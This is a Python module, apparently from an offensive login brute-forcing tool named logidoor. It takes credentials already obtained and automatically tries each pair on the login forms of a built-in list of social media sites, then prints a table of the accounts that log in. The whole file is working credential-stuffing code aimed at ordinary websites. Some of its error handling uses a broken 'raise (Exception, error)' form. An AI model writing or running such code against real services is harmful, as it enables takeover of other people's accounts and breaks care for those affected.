from logidoor.old.modules.brute import loginbrute
from logidoor.old import data
from logidoor.old.libs.utils import events
from logidoor.old.libs.cores.browser import Browser
from logidoor.old.libs.cores.check import find_login_form

try:
    from Queue import Queue
except ImportError:
    from queue import Queue


def do_job(jobs):
    for job in jobs:
        job.start()

    for job in jobs:
        job.join()


def submit(url, options, tryCreds, result):
    try:
        proc = Browser()

        events.info(f"Checking {url}", "REAUTH")

        proc.open(url)
        loginInfo = find_login_form(proc.forms())

    except Exception as error:
        raise (Exception, error)

    if not loginInfo:
        raise (Exception, "No login form found")

    else:
        try:
            options.url = url

            loginbrute.submit(
                # Reverse username + password. Dynamic submit in loginbrute
                options, loginInfo, tryCreds[-2:][::-1], result
            )
        except Exception as error:
            raise Exception(error)


def run(options, creds):
    social_urls = data.social_urls().replace("\t", "").split("\n")

    for url in social_urls:
        if options.url in url:
            social_urls.remove(url)

    result = Queue()
    # workers = []

    try:
        for tryCreds in creds:
            for url in social_urls:
                submit(url, options, tryCreds, result)

        # if len(workers) == options.threads:
        # 	do_job(workers)
        # 	del workers[:]

        # worker = threading.Thread(
        # 	target = submit,
        # 	args = (url, options, tryCreds, result)
        # )

        # worker.daemon = True
        # workers.append(worker)

    # do_job(workers)
    # del workers[:]

    except KeyboardInterrupt:
        raise Exception("Terminated by user")

    except SystemExit:
        raise Exception("Terminated by system")

    except Exception as error:
        raise Exception(error)

    finally:
        result = list(result.queue)

        if len(result) == 0:
            events.error("No valid account found", "RESULT")
        else:
            from logidoor.old.libs.utils import print_table
            print_table(("Target", "Username", "Password"), *result)
